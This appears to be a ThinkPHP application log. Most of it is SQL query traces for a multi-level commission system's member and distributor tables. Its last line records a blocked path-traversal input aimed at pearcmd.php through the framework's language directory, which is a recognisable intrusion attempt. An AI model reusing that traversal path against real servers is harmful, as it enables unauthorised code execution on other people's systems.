[2022-12-14T16:25:14+08:00][sql] SELECT `f`.*,pf.fenxiao_name as parent_name,`nm`.`nickname`,`nm`.`headimg` FROM `gxfc_fenxiao` `f` LEFT JOIN `gxfc_fenxiao` `pf` ON `pf`.`fenxiao_id`=`f`.`parent` INNER JOIN `gxfc_member` `nm` ON `nm`.`member_id`=`f`.`member_id` WHERE  `f`.`member_id` = '2395'  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000609s ]
[2022-12-14T16:25:14+08:00][sql] SELECT COUNT(*) AS think_count FROM `gxfc_member` WHERE  `fenxiao_id` = 63  AND `is_fenxiao` = 0  AND `is_delete` = 0 [ RunTime:0.000296s ]
[2022-12-14T16:25:14+08:00][sql] SELECT `f`.`level_id`,`m`.`order_num`,`m`.`order_money`,`f`.`one_fenxiao_order_num`,`f`.`one_fenxiao_order_money`,`f`.`one_child_num`,`f`.`one_child_fenxiao_num`,`fl`.`one_rate`,`fl`.`level_num` FROM `gxfc_fenxiao` `f` INNER JOIN `gxfc_member` `m` ON `f`.`member_id`=`m`.`member_id` INNER JOIN `gxfc_fenxiao_level` `fl` ON `f`.`level_id`=`fl`.`level_id` WHERE  `f`.`member_id` = '2395'  AND `f`.`status` = 1  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000490s ]
[2022-12-14T16:25:14+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_level` [ RunTime:0.000497s ]
[2022-12-14T16:25:14+08:00][sql] SELECT * FROM `gxfc_fenxiao_level` WHERE  `level_num` >= 1  AND `level_id` <> 1 ORDER BY `level_num` ASC,`one_rate` ASC LIMIT 1 [ RunTime:0.000323s ]
[2022-12-14T16:25:15+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_order` [ RunTime:0.000781s ]
[2022-12-14T16:25:15+08:00][sql] SELECT sum(one_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `one_fenxiao_id` = 63  AND `create_time` BETWEEN 1670947200 AND 1671033600   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000307s ]
[2022-12-14T16:25:15+08:00][sql] SELECT sum(two_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `two_fenxiao_id` = 63  AND `create_time` BETWEEN 1670947200 AND 1671033600   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000288s ]
[2022-12-14T16:25:15+08:00][sql] SELECT sum(three_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `three_fenxiao_id` = 63  AND `create_time` BETWEEN 1670947200 AND 1671033600   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000326s ]
[2022-12-14T16:25:15+08:00][sql] SELECT sum(real_goods_money) as real_goods_money FROM `gxfc_fenxiao_order` WHERE  ( `one_fenxiao_id` = 63 OR `two_fenxiao_id` = 63 OR `three_fenxiao_id` = 63 ) LIMIT 1 [ RunTime:0.000327s ]
[2022-12-14T16:25:15+08:00][sql] CONNECT:[ UseTime:0.000480s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-14T16:25:15+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000927s ]
[2022-12-14T16:25:15+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2395 LIMIT 1 [ RunTime:0.000608s ]
[2022-12-14T16:25:15+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000656s ]
[2022-12-14T16:25:15+08:00][sql] SELECT `fenxiao_id`,`fenxiao_no`,`fenxiao_name`,`mobile`,`member_id`,`level_id`,`level_name`,`parent`,`grand_parent`,`account`,`account_withdraw`,`account_withdraw_apply`,`status`,`create_time`,`audit_time`,`lock_time`,`one_fenxiao_order_num`,`one_fenxiao_order_money`,`one_child_num`,`one_child_fenxiao_num`,`two_child_fenxiao_num`,`total_commission`,`is_delete`,`two_rate` FROM `gxfc_fenxiao` WHERE  `member_id` = 2395 LIMIT 1 [ RunTime:0.000416s ]
[2022-12-14T16:25:15+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `source_member` = 2395 [ RunTime:0.000672s ]
[2022-12-14T16:25:15+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_account` [ RunTime:0.000536s ]
[2022-12-14T16:25:15+08:00][sql] SELECT `id`,`account_no`,`fenxiao_id`,`fenxiao_name`,`money`,`type`,`type_name`,`relate_id`,`create_time` FROM `gxfc_fenxiao_account` WHERE  `fenxiao_id` = 63 [ RunTime:0.000286s ]
[2022-12-14T20:55:31+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
